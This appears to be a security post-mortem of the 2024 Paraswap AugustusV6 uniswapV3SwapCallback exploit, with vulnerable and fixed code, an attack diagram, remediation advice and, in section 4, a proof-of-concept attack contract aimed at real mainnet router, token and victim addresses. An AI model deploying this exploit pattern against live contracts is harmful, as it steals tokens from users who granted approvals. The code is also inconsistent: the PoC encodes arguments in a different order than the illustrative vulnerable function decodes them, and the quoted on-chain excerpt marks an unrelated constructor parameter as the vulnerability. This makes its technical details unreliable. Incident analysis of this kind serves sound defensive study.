# Paraswap — uniswapV3SwapCallback Arbitrary transferFrom Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | Paraswap (AugustusV6) |
| **Chain** | Ethereum |
| **Loss** | ~$24,000 |
| **Attacker** | [0x2aD8aed8](https://etherscan.io/address/0x2aD8aed847e8d4D3da52AaBB7d0f5c25729D10df) |
| **Vulnerable Contract** | [AugustusV6 0x00000000](https://etherscan.io/address/0x00000000FdAC7708D0D360BDDc1bc7d097F47439) |
| **Victim** | [0x0cc396F5](https://etherscan.io/address/0x0cc396F558aAE5200bb0aBB23225aCcafCA31E27) |
| **OPSEC Token** | [0x6A7eFF1e](https://etherscan.io/address/0x6A7eFF1e2c355AD6eb91BEbB5ded49257F3FED98) |
| **Root Cause** | The `uniswapV3SwapCallback()` function can be called directly from the outside, and by supplying a malicious `data` parameter an attacker can execute `transferFrom` on a victim's tokens, exploiting approvals already granted to AugustusV6 |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/Paraswap_exp.sol) |

---

## 1. Vulnerability Overview

The `uniswapV3SwapCallback()` function in Paraswap AugustusV6 should only be called by an actual Uniswap V3 pool, but due to the absence of caller validation, anyone can invoke it directly. The attacker executed a `transferFrom` on the victim's OPSEC tokens by passing a maliciously encoded `data` parameter. The existing approval the victim had granted to AugustusV6 was exploited.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no caller validation in uniswapV3SwapCallback
function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes memory data  // ← attacker injects arbitrary data
) external {
    // No validation that msg.sender is an actual V3 pool
    // Decode token, amount, victim from data
    (address token, uint256 amount, address victim) = abi.decode(data, (address, uint256, address));
    // ← Transfer victim's tokens to the contract (exploiting victim's approval)
    IERC20(token).transferFrom(victim, address(this), amount);
}

// ✅ Safe code: validate that caller is an actual V3 pool
function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes memory data
) external {
    // Verify caller is the correct V3 pool address
    (address tokenIn, address tokenOut, uint24 fee) = abi.decode(data[:96], (address, address, uint24));
    address expectedPool = IUniswapV3Factory(factory).getPool(tokenIn, tokenOut, fee);
    require(msg.sender == expectedPool, "invalid caller");
    // Execute actual callback logic after validation
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: AugustusV6.sol
        address _diamondCutFacet,
        /// @dev Direct Routers
        address _weth,
        address payable _balancerVault,
        uint256 _uniV3FactoryAndFF,
        uint256 _uniswapV3PoolInitCodeHash,  // ❌ vulnerability
        uint256 _uniswapV2FactoryAndFF,
        uint256 _uniswapV2PoolInitCodeHash,
        address _rfq,
        /// @dev Fees
        address payable _feeVault,
        /// @dev Permit2
        address _permit2
    )
        Diamond(_owner, _diamondCutFacet)
        Routers(
            _weth,
            _uniV3FactoryAndFF,
            _uniswapV3PoolInitCodeHash,
            _uniswapV2FactoryAndFF,
            _uniswapV2PoolInitCodeHash,
            _balancerVault,
            _permit2,
            _rfq,
            _feeVault
        )
    { }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Query victim address and OPSEC balance
  │         └─ victim = 0x0cc396F5..., balance = ~2.5T OPSEC
  │
  ├─→ [2] Encode transferFrom calldata
  │         └─ data = abi.encode(OPSEC, victim, balance, ...)
  │
  ├─→ [3] Call AugustusV6.uniswapV3SwapCallback(0, 0, maliciousData) directly
  │         └─ No caller validation → executes immediately
  │
  ├─→ [4] OPSEC.transferFrom(victim, AugustusV6, balance) executed
  │         └─ Exploits victim's approval to AugustusV6
  │
  ├─→ [5] Transfer OPSEC from AugustusV6 to attacker address
  │
  └─→ [6] ~$24K OPSEC stolen
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IParaSwapAugustusV6 {
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes memory data
    ) external;
}

contract AttackContract {
    IParaSwapAugustusV6 constant augustus = IParaSwapAugustusV6(0x00000000FdAC7708D0D360BDDc1bc7d097F47439);
    IERC20 constant OPSEC  = IERC20(0x6A7eFF1e2c355AD6eb91BEbB5ded49257F3FED98);
    address constant victim = 0x0cc396F558aAE5200bb0aBB23225aCcafCA31E27;

    function testExploit() external {
        uint256 victimBalance = OPSEC.balanceOf(victim);

        // [1] Encode calldata to transfer victim's tokens to AugustusV6
        bytes memory maliciousData = abi.encode(
            address(OPSEC),   // token address
            victim,           // from (victim)
            victimBalance,    // transfer amount
            address(this)     // recipient
        );

        // [2] Call callback directly (no caller validation)
        augustus.uniswapV3SwapCallback(0, 0, maliciousData);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Callback Caller Validation |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (direct call to uniswapV3SwapCallback) |
| **DApp Category** | DEX Aggregator |
| **Impact** | Unauthorized theft of tokens approved by victims |

## 6. Remediation Recommendations

1. **Callback Caller Validation**: Verify in `uniswapV3SwapCallback()` that `msg.sender` is the actual V3 pool address
2. **Data Parameter Validation**: Cross-validate addresses and amounts decoded from `data` within the callback against internal state
3. **Approval Minimization**: Guide users to approve only the exact required amount rather than unlimited approvals
4. **Callback Execution Lock**: Track the callback invocation state with an internal variable during swap execution

## 7. Lessons Learned

- Uniswap V3 callback functions (`uniswapV3SwapCallback`, `uniswapV3FlashCallback`, etc.) must only be callable from an actual V3 pool.
- When a DEX aggregator is the contract that holds user approvals, missing callback validation turns every approver into a potential victim.
- Token approvals granted by users to a contract can be exploited through any vulnerability present in that contract.